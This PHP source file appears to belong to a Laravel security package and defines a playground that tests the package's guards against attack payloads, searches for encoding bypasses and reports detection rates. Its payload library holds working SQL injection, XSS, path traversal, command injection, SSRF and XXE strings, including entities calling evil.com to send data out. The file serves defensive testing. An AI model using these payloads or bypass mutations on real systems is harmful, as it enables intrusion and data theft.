<?php

declare(strict_types=1);

namespace M9nx\RuntimeGuard\DevTools;

use M9nx\RuntimeGuard\Contracts\GuardInterface;
use M9nx\RuntimeGuard\Context\RuntimeContext;
use M9nx\RuntimeGuard\Results\GuardResult;
use Illuminate\Http\Request;

/**
 * Security Playground.
 *
 * Interactive testing environment for security guards:
 * - Test payloads against guards
 * - Visualize guard responses
 * - Debug rule matching
 * - Generate attack simulations
 */
class SecurityPlayground
{
    private array $guards = [];
    private array $testHistory = [];
    private array $payloadLibrary;

    public function __construct(array $guards = [])
    {
        foreach ($guards as $guard) {
            if ($guard instanceof GuardInterface) {
                $this->guards[$guard->getName()] = $guard;
            }
        }

        $this->payloadLibrary = $this->initializePayloadLibrary();
    }

    /**
     * Test a payload against all guards.
     */
    public function testPayload(string $payload, array $options = []): PlaygroundResult
    {
        $guardNames = $options['guards'] ?? array_keys($this->guards);
        $method = $options['method'] ?? 'POST';
        $contentType = $options['content_type'] ?? 'application/x-www-form-urlencoded';

        // Create mock request
        $request = $this->createMockRequest($payload, $method, $contentType, $options);
        $context = new RuntimeContext($request);

        $results = [];
        $startTime = microtime(true);

        foreach ($guardNames as $guardName) {
            if (!isset($this->guards[$guardName])) {
                continue;
            }

            $guard = $this->guards[$guardName];
            $guardStart = microtime(true);

            try {
                $result = $guard->inspect($context);
                $results[$guardName] = [
                    'passed' => $result->isPassed(),
                    'threats' => $result->getThreats(),
                    'metadata' => $result->getMetadata(),
                    'execution_time' => microtime(true) - $guardStart,
                ];
            } catch (\Throwable $e) {
                $results[$guardName] = [
                    'error' => $e->getMessage(),
                    'execution_time' => microtime(true) - $guardStart,
                ];
            }
        }

        $totalTime = microtime(true) - $startTime;
        $playgroundResult = new PlaygroundResult($payload, $results, $totalTime);

        // Store in history
        $this->testHistory[] = [
            'payload' => substr($payload, 0, 200),
            'timestamp' => time(),
            'blocked' => $playgroundResult->wasBlocked(),
            'guards_triggered' => $playgroundResult->getTriggeredGuards(),
        ];

        return $playgroundResult;
    }

    /**
     * Test multiple payloads in batch.
     */
    public function testBatch(array $payloads, array $options = []): array
    {
        $results = [];

        foreach ($payloads as $index => $payload) {
            $results[$index] = $this->testPayload($payload, $options);
        }

        return $results;
    }

    /**
     * Test payloads from library category.
     */
    public function testCategory(string $category, array $options = []): array
    {
        $payloads = $this->payloadLibrary[$category] ?? [];
        $results = [];

        foreach ($payloads as $name => $payload) {
            $results[$name] = $this->testPayload($payload, $options);
        }

        return [
            'category' => $category,
            'total' => count($payloads),
            'blocked' => count(array_filter($results, fn($r) => $r->wasBlocked())),
            'passed' => count(array_filter($results, fn($r) => !$r->wasBlocked())),
            'results' => $results,
        ];
    }

    /**
     * Run comprehensive security test.
     */
    public function runComprehensiveTest(array $options = []): ComprehensiveTestResult
    {
        $allResults = [];
        $categorySummary = [];

        foreach (array_keys($this->payloadLibrary) as $category) {
            $categoryResults = $this->testCategory($category, $options);
            $allResults[$category] = $categoryResults['results'];
            $categorySummary[$category] = [
                'total' => $categoryResults['total'],
                'blocked' => $categoryResults['blocked'],
                'detection_rate' => $categoryResults['total'] > 0
                    ? round($categoryResults['blocked'] / $categoryResults['total'], 4)
                    : 0,
            ];
        }

        $totalPayloads = array_sum(array_column($categorySummary, 'total'));
        $totalBlocked = array_sum(array_column($categorySummary, 'blocked'));

        return new ComprehensiveTestResult(
            $allResults,
            $categorySummary,
            $totalPayloads,
            $totalBlocked,
            $totalPayloads > 0 ? round($totalBlocked / $totalPayloads, 4) : 0
        );
    }

    /**
     * Explain why a payload was blocked/allowed.
     */
    public function explain(string $payload, array $options = []): array
    {
        $result = $this->testPayload($payload, $options);
        $explanations = [];

        foreach ($result->getResults() as $guardName => $guardResult) {
            $explanation = [
                'guard' => $guardName,
                'verdict' => $guardResult['passed'] ?? false ? 'ALLOWED' : 'BLOCKED',
            ];

            if (!($guardResult['passed'] ?? true)) {
                $explanation['reasons'] = [];
                foreach ($guardResult['threats'] ?? [] as $threat) {
                    $explanation['reasons'][] = [
                        'type' => $threat['type'] ?? 'unknown',
                        'message' => $threat['message'] ?? 'No message',
                        'severity' => $threat['severity'] ?? 'unknown',
                        'details' => $threat['details'] ?? [],
                    ];
                }
            }

            $explanations[$guardName] = $explanation;
        }

        return [
            'payload' => $payload,
            'overall_verdict' => $result->wasBlocked() ? 'BLOCKED' : 'ALLOWED',
            'guard_explanations' => $explanations,
        ];
    }

    /**
     * Find bypass for a guard (for testing purposes).
     */
    public function findBypass(string $guardName, string $basePayload, array $options = []): array
    {
        if (!isset($this->guards[$guardName])) {
            return ['error' => "Guard not found: {$guardName}"];
        }

        $mutations = $this->generateMutations($basePayload);
        $bypasses = [];

        foreach ($mutations as $name => $mutation) {
            $result = $this->testPayload($mutation, array_merge($options, ['guards' => [$guardName]]));

            if (!$result->wasBlocked()) {
                $bypasses[] = [
                    'mutation' => $name,
                    'payload' => $mutation,
                ];
            }
        }

        return [
            'base_payload' => $basePayload,
            'guard' => $guardName,
            'mutations_tested' => count($mutations),
            'bypasses_found' => count($bypasses),
            'bypasses' => $bypasses,
        ];
    }

    /**
     * Generate payload mutations for testing.
     */
    private function generateMutations(string $payload): array
    {
        return [
            'original' => $payload,
            'url_encoded' => urlencode($payload),
            'double_url_encoded' => urlencode(urlencode($payload)),
            'uppercase' => strtoupper($payload),
            'lowercase' => strtolower($payload),
            'mixed_case' => $this->mixCase($payload),
            'with_null_byte' => $payload . "\x00",
            'with_comments' => $this->injectComments($payload),
            'unicode_escaped' => $this->unicodeEscape($payload),
            'html_encoded' => htmlentities($payload),
            'hex_encoded' => $this->hexEncode($payload),
            'with_whitespace' => $this->addWhitespace($payload),
            'reversed' => strrev($payload),
            'base64' => base64_encode($payload),
        ];
    }

    /**
     * Mix case in string.
     */
    private function mixCase(string $str): string
    {
        $result = '';
        for ($i = 0; $i < strlen($str); $i++) {
            $result .= $i % 2 === 0 ? strtoupper($str[$i]) : strtolower($str[$i]);
        }
        return $result;
    }

    /**
     * Inject SQL-style comments.
     */
    private function injectComments(string $payload): string
    {
        $words = explode(' ', $payload);
        return implode('/**/', $words);
    }

    /**
     * Unicode escape characters.
     */
    private function unicodeEscape(string $str): string
    {
        $result = '';
        for ($i = 0; $i < strlen($str); $i++) {
            $result .= sprintf('\u%04x', ord($str[$i]));
        }
        return $result;
    }

    /**
     * Hex encode string.
     */
    private function hexEncode(string $str): string
    {
        $result = '';
        for ($i = 0; $i < strlen($str); $i++) {
            $result .= '%' . sprintf('%02x', ord($str[$i]));
        }
        return $result;
    }

    /**
     * Add random whitespace.
     */
    private function addWhitespace(string $payload): string
    {
        $whitespace = [' ', "\t", "\n", "\r"];
        $result = '';
        for ($i = 0; $i < strlen($payload); $i++) {
            $result .= $payload[$i];
            if ($i % 3 === 0) {
                $result .= $whitespace[array_rand($whitespace)];
            }
        }
        return $result;
    }

    /**
     * Create mock request.
     */
    private function createMockRequest(
        string $payload,
        string $method,
        string $contentType,
        array $options
    ): Request {
        $request = Request::create(
            $options['uri'] ?? '/test',
            $method,
            $method === 'GET' ? ['q' => $payload] : [],
            [],
            [],
            [
                'CONTENT_TYPE' => $contentType,
                'HTTP_USER_AGENT' => $options['user_agent'] ?? 'SecurityPlayground/1.0',
            ],
            $method !== 'GET' ? $payload : null
        );

        if ($method !== 'GET') {
            $request->merge(['payload' => $payload]);
        }

        return $request;
    }

    /**
     * Initialize payload library.
     */
    private function initializePayloadLibrary(): array
    {
        return [
            'sql_injection' => [
                'basic_or' => "' OR '1'='1",
                'basic_or_comment' => "' OR '1'='1'--",
                'union_select' => "' UNION SELECT * FROM users--",
                'stacked_queries' => "'; DROP TABLE users;--",
                'time_based' => "' AND SLEEP(5)--",
                'error_based' => "' AND 1=CONVERT(int, @@version)--",
                'boolean_based' => "' AND 1=1--",
                'order_by_injection' => "1 ORDER BY 10--",
                'insert_injection' => "'); INSERT INTO users VALUES ('hacker', 'password');--",
                'second_order' => "admin'--",
            ],
            'xss' => [
                'basic_script' => '<script>alert(1)</script>',
                'img_onerror' => '<img src=x onerror=alert(1)>',
                'svg_onload' => '<svg onload=alert(1)>',
                'body_onload' => '<body onload=alert(1)>',
                'javascript_uri' => '<a href="javascript:alert(1)">click</a>',
                'event_handler' => '<div onclick="alert(1)">click</div>',
                'encoded_script' => '&lt;script&gt;alert(1)&lt;/script&gt;',
                'data_uri' => '<a href="data:text/html,<script>alert(1)</script>">x</a>',
                'template_injection' => '{{constructor.constructor("alert(1)")()}}',
                'style_expression' => '<div style="background:url(javascript:alert(1))">',
            ],
            'path_traversal' => [
                'basic' => '../../../etc/passwd',
                'encoded' => '..%2f..%2f..%2fetc%2fpasswd',
                'double_encoded' => '..%252f..%252f..%252fetc%252fpasswd',
                'null_byte' => "../../../etc/passwd\x00.png",
                'windows' => '..\\..\\..\\windows\\system32\\config\\sam',
                'absolute' => '/etc/passwd',
                'url_absolute' => 'file:///etc/passwd',
            ],
            'command_injection' => [
                'semicolon' => '; ls -la',
                'pipe' => '| cat /etc/passwd',
                'backtick' => '`id`',
                'subshell' => '$(whoami)',
                'and_operator' => '&& id',
                'or_operator' => '|| id',
                'newline' => "test\nid",
                'encoded_newline' => 'test%0Aid',
            ],
            'xxe' => [
                'basic' => '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                'parameter_entity' => '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo></foo>',
                'blind' => '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/?data=">]><foo>&xxe;</foo>',
            ],
            'ssrf' => [
                'localhost' => 'http://localhost/admin',
                'internal_ip' => 'http://192.168.1.1/admin',
                'aws_metadata' => 'http://169.254.169.254/latest/meta-data/',
                'gcp_metadata' => 'http://metadata.google.internal/computeMetadata/v1/',
                'azure_metadata' => 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            ],
            'prototype_pollution' => [
                '__proto__' => '{"__proto__": {"admin": true}}',
                'constructor' => '{"constructor": {"prototype": {"admin": true}}}',
                'nested' => '{"a": {"__proto__": {"admin": true}}}',
            ],
        ];
    }

    /**
     * Get test history.
     */
    public function getHistory(): array
    {
        return $this->testHistory;
    }

    /**
     * Get payload library categories.
     */
    public function getCategories(): array
    {
        return array_keys($this->payloadLibrary);
    }

    /**
     * Add custom payload to library.
     */
    public function addPayload(string $category, string $name, string $payload): void
    {
        if (!isset($this->payloadLibrary[$category])) {
            $this->payloadLibrary[$category] = [];
        }
        $this->payloadLibrary[$category][$name] = $payload;
    }

    /**
     * Get registered guards.
     */
    public function getGuards(): array
    {
        return array_keys($this->guards);
    }
}

/**
 * Playground test result.
 */
class PlaygroundResult
{
    public function __construct(
        private string $payload,
        private array $results,
        private float $totalTime
    ) {}

    public function wasBlocked(): bool
    {
        foreach ($this->results as $result) {
            if (!($result['passed'] ?? true)) {
                return true;
            }
        }
        return false;
    }

    public function getTriggeredGuards(): array
    {
        return array_keys(array_filter(
            $this->results,
            fn($r) => !($r['passed'] ?? true)
        ));
    }

    public function getResults(): array
    {
        return $this->results;
    }

    public function getTotalTime(): float
    {
        return $this->totalTime;
    }

    public function toArray(): array
    {
        return [
            'payload' => $this->payload,
            'blocked' => $this->wasBlocked(),
            'triggered_guards' => $this->getTriggeredGuards(),
            'total_time_ms' => round($this->totalTime * 1000, 2),
            'results' => $this->results,
        ];
    }
}

/**
 * Comprehensive test result.
 */
class ComprehensiveTestResult
{
    public function __construct(
        public readonly array $allResults,
        public readonly array $categorySummary,
        public readonly int $totalPayloads,
        public readonly int $totalBlocked,
        public readonly float $overallDetectionRate
    ) {}

    public function toArray(): array
    {
        return [
            'total_payloads' => $this->totalPayloads,
            'total_blocked' => $this->totalBlocked,
            'overall_detection_rate' => $this->overallDetectionRate,
            'category_summary' => $this->categorySummary,
        ];
    }
}
